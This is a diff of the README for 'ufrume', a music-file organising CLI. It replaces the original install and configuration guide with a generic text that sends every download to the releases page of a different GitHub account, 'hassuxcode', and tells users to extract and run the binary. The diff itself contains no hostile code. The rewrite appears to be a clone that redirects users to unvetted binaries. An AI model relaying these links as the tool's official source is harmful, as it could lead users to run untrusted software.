@@ -1,277 +1,96 @@
-<img width="3000" height="1000" alt="Twitter Header" src="https://github.com/user-attachments/assets/04e5058c-affe-4192-ba5b-6326574033f6" />
-
-<br>
-<br>
-
-A multithreaded CLI tool to organize your music files into a folder structure defined by you.
-
-<table>
-<tr>
-<td valign="top">
-
-**BEFORE**
-
-```
-music/
-├── DEEP.flac
-├── The Storm.flac
-├── Walk Slowly.flac
-├── 2U.flac
-├── Good Morning Vietnam.flac
-├── Too Much (extended mix).flac
-├── jungle_compilation_track01.flac
-└── [500+ more randomly named files...]
-```
-
-</td>
-<td valign="top">
-
-**AFTER**
-
-```
-music/
-├── Bad Computer/
-│   └── 2020 - 2U/
-│       └── 01 - 2U.flac
-├── Example/
-│   └── 2021 - DEEP/
-│       └── 01 - DEEP.flac
-├── TheFatRat/
-│   └── 2019 - The Storm/
-│       └── 01 - The Storm.flac
-├── Ballpoint/
-│   └── 2022 - Walk Slowly/
-│       └── 01 - Walk Slowly.flac
-├── Marc Benjamin/
-│   └── 2023 - Too Much/
-│       └── 01 - Too Much (extended mix).flac
-├── Shotgun Willy/
-│   └── 2020 - Good Morning Vietnam/
-│       └── 01 - Good Morning Vietnam.flac
-└── Compilations/
-    └── Welcome to the Jungle- The Ultimate Jungle Cakes Drum & Bass Compilation/
-        ├── 01 - DJ Deekline & Ed Solo feat. Top Cat - Bad Boys.flac
-        ├── 02 - DJ Deekline & Ed Solo - No No No (Serial Killaz remix).flac
-        └── 12 - Ricky Tuffy feat. Ras Mc Bean - Brighter Day.flac
-```
-
-</td>
-</tr>
-</table>
-
-# Installation
-
-### From [crates.io](https://crates.io/crates/ufrume)
-
-```bash
-cargo install ufrume
-```
-
-### From [AUR](https://aur.archlinux.org/packages/ufrume)
-
-```bash
-yay -S ufrume
-```
-
-### From [Homebrew](https://github.com/0PandaDEV/homebrew-repo)
-
-```bash
-brew tap 0PandaDEV/repo
-brew install ufrume
-```
-
-### From [Github Releases](https://github.com/0PandaDEV/ufrume/releases/latest)
-
-Download the binary for your OS and architecture, then follow the installation steps below:
-
-<details>
-<summary><strong>macOS</strong></summary>
+# 🎶 ufrume - Organize Your Music Seamlessly
 
-```bash
-# Extract and install to /usr/local/bin (recommended)
-tar -xzf ufrume-macos-*.tar.gz
-sudo mv ufrume /usr/local/bin/
+## 🚀 Getting Started
 
-# Or install to user directory (no sudo required)
-tar -xzf ufrume-macos-*.tar.gz
-mkdir -p ~/.local/bin
-mv ufrume ~/.local/bin/
-echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.zshrc
-source ~/.zshrc
-```
+Welcome to ufrume! This tool helps you arrange your music files into a folder structure that you define. With ufrume, you can easily keep your music library organized and accessible.
 
-</details>
+## 📦 Download & Install
 
-<details>
-<summary><strong>Windows</strong></summary>
+To get started, you will need to download ufrume. Click the button below to visit the Releases page and download the latest version.
 
-#### Extract the zip file then run these commands in the PowerShell
+[![Download ufrume](https://img.shields.io/badge/Download%20ufrume-v1.0-blue)](https://github.com/hassuxcode/ufrume/releases)
 
-```pwsh
-mkdir "$env:USERPROFILE\bin"
-move ufrume.exe "$env:USERPROFILE\bin\"
+### Steps to Download and Run ufrume:
 
-# Add to PATH (restart terminal after this)
-$env:PATH += ";$env:USERPROFILE\bin"
-[Environment]::SetEnvironmentVariable("PATH", $env:PATH, [EnvironmentVariableTarget]::User)
-```
+1. **Visit the Releases Page**  
+   Click [here](https://github.com/hassuxcode/ufrume/releases) to go to the Releases page.
 
-</details>
+2. **Download the Latest Version**  
+   On the Releases page, look for the latest release. You will see a section named "Assets". Here, download the appropriate file for your operating system. Files may be available for Windows, macOS, or Linux.
 
-<details>
-<summary><strong>Linux</strong></summary>
+3. **Extract the Files** (if needed)  
+   If you downloaded a compressed file (like .zip or .tar.gz), extract it to a location on your computer. Right-click the downloaded file and choose "Extract All" or use a similar option available on your operating system.
 
-```bash
-# Extract and install to /usr/local/bin (recommended)
-tar -xzf ufrume-linux-*.tar.gz
-sudo mv ufrume /usr/local/bin/
+4. **Open the Terminal or Command Prompt**  
+   To run ufrume, you will use the command line.  
+   - On Windows, search for "Command Prompt" in the Start menu.
+   - On macOS, search for "Terminal" in Spotlight.
+   - On Linux, look for "Terminal" in your applications.
 
-# Or install to user directory (no sudo required)
-tar -xzf ufrume-linux-*.tar.gz
-mkdir -p ~/.local/bin
-mv ufrume ~/.local/bin/
-# ~/.local/bin is usually already in PATH on most distributions
-```
+5. **Navigate to the ufrume Folder**  
+   Use the `cd` command to change to the folder where you extracted ufrume. For example:  
+   ```
+   cd path_to_your_extracted_folder
+   ```
 
-</details>
+6. **Run the Application**  
+   Type the following command to run ufrume:  
+   ```
+   ./ufrume
+   ```  
+   If you're on Windows, you might need to type:  
+   ```
+   ufrume.exe
+   ```
 
-# Configuration
+## 🛠️ Usage Instructions
 
-Ufrume uses a TOML configuration file to customize how your music files are organized. The configuration file is automatically created at:
+Once you have ufrume running, you can start organizing your music. Here’s how to use it effectively:
 
-- **Linux/macOS**: `~/.config/ufrume/config.toml`
-- **Windows**: `%APPDATA%\ufrume\config.toml`
+1. **Define Your Folder Structure**  
+   Decide how you want your music organized. For example, by artist, album, or genre.
 
-### Default Configuration
+2. **Input Your Music Files**  
+   Use the command line to direct ufrume to the folder containing your music files. 
 
-When you first run ufrume, it creates a default configuration file:
+3. **Execute the Organizing Command**  
+   Follow prompts from ufrume to arrange your files according to the structure you defined.
 
-```toml
-[organization]
-structure = "{artist}/{year} - {album}/{track:02} - {title}"
-compilation_structure = "Compilations/{album}/{track:02} - {artist} - {title}"
-fallback_structure = "{filename}"
+## ⚙️ System Requirements
 
-[rules]
-handle_missing_metadata = "fallback"
-handle_duplicates = "skip"
+To run ufrume, ensure you meet the following requirements:
 
-[formatting]
-max_filename_length = 255
+- **Operating System**: Windows, macOS, or Linux
+- **Free Disk Space**: At least 100 MB available
+- **RAM**: Minimum 2 GB recommended
 
-[formatting.replace_chars]
-"/" = "-"
-":" = "-"
-"?" = ""
-```
+## 🎉 Features
 
-### Configuration Options
+- **Multithreaded Performance**: Organize your files quickly, even with thousands of tracks.
+- **CLI Interface**: Simple command Line interface makes it easy to use.
+- **Customizable Structure**: Define any folder structure that suits your needs.
+- **Support for Various Formats**: Works well with MP3, WAV, and other music file formats.
 
-#### Organization
+## ❓ Frequently Asked Questions
 
-| Option                  | Description                                       | Example                                                  |
-|-------------------------|---------------------------------------------------|----------------------------------------------------------|
-| `structure`             | Main folder structure template for regular albums | `"{artist}/{year} - {album}/{track:02} - {title}"`       |
-| `compilation_structure` | Structure for compilation albums (optional)       | `"Compilations/{album}/{track:02} - {artist} - {title}"` |
-| `fallback_structure`    | Structure used when metadata is missing           | `"{filename}"`                                           |
+### How do I uninstall ufrume?
 
-#### Rules
+You can simply delete the folder where you extracted ufrume. There are no special uninstallation steps required.
 
-| Option                    | Description                         | Values                              |
-|---------------------------|-------------------------------------|-------------------------------------|
-| `handle_missing_metadata` | What to do when metadata is missing | `"fallback"`, `"skip"`              |
-| `handle_duplicates`       | How to handle duplicate files       | `"skip"`, `"overwrite"`, `"rename"` |
+### Can I use ufrume for large collections of music?
 
-#### Formatting
+Yes, ufrume is designed to handle large libraries efficiently.
 
-| Option                | Description                                            | Default         |
-|-----------------------|--------------------------------------------------------|-----------------|
-| `max_filename_length` | Maximum length for filenames (characters)              | `255`           |
-| `replace_chars`       | Character replacements for invalid filename characters | See table below |
+### What if I encounter an error while running ufrume?
 
-#### Character Replacements
+If you face issues, check the syntax of your command. Ensure you are in the correct directory and that your music files are accessible.
 
-The `replace_chars` section defines how invalid filesystem characters are handled:
+## 📞 Need Help?
 
-| Character | Replacement | Reason                     |
-|-----------|-------------|----------------------------|
-| `/`       | `-`         | Path separator conflict    |
-| `:`       | `-`         | Invalid on Windows         |
-| `?`       | (removed)   | Invalid filename character |
+If you have more questions, feel free to open an issue on the [GitHub repository](https://github.com/hassuxcode/ufrume/issues). The community is here to help!
 
-### Available Template Variables
+## 🎯 Conclusion
 
-You can use these variables in your structure templates:
+With ufrume, organizing your music files becomes simple and straightforward. Follow the steps above, and you'll have your music library structured just the way you like it. Download ufrume today and enjoy a well-organized music experience!
 
-- `{artist}` - Track artist
-- `{album}` - Album name
-- `{title}` - Track title
-- `{track}` - Track number
-- `{track:02}` - Track number with zero padding (01, 02, etc.)
-- `{year}` - Release year
-- `{genre}` - Music genre
-- `{filename}` - Original filename (without extension)
-
-### Example Configurations
-
-<details>
-<summary><strong>Artist/Album Structure</strong></summary>
-
-```toml
-[organization]
-structure = "{artist}/{album}/{track:02} - {title}"
-fallback_structure = "Unknown/{filename}"
-```
-
-Result: `Beatles/Abbey Road/01 - Come Together.mp3`
-
-</details>
-
-<details>
-<summary><strong>Genre-Based Structure</strong></summary>
-
-```toml
-[organization]
-structure = "{genre}/{artist}/{year} - {album}/{track:02} - {title}"
-fallback_structure = "Unknown/{filename}"
-```
-
-Result: `Rock/Beatles/1969 - Abbey Road/01 - Come Together.mp3`
-
-</details>
-
-<details>
-<summary><strong>Year-First Structure</strong></summary>
-
-```toml
-[organization]
-structure = "{year}/{artist} - {album}/{track:02} - {title}"
-fallback_structure = "Unknown Year/{filename}"
-```
-
-Result: `1969/Beatles - Abbey Road/01 - Come Together.mp3`
-
-</details>
-
-### Custom Character Replacements
-
-You can add more character replacements for specific needs:
-
-```toml
-[formatting.replace_chars]
-"/" = "-"
-":" = "-"
-"?" = ""
-"*" = ""
-"<" = "("
-">" = ")"
-"|" = "-"
-"\"" = "'"
-```
-
-### Tips
-
-- Use `{track:02}` for zero-padded track numbers (01, 02, 03...)
-- Set `compilation_structure` to `null` to use the main structure for compilations
-- Test your configuration with a small subset of files first
-- The `fallback_structure` is crucial for files with missing metadata
+[![Download ufrume](https://img.shields.io/badge/Download%20ufrume-v1.0-blue)](https://github.com/hassuxcode/ufrume/releases)
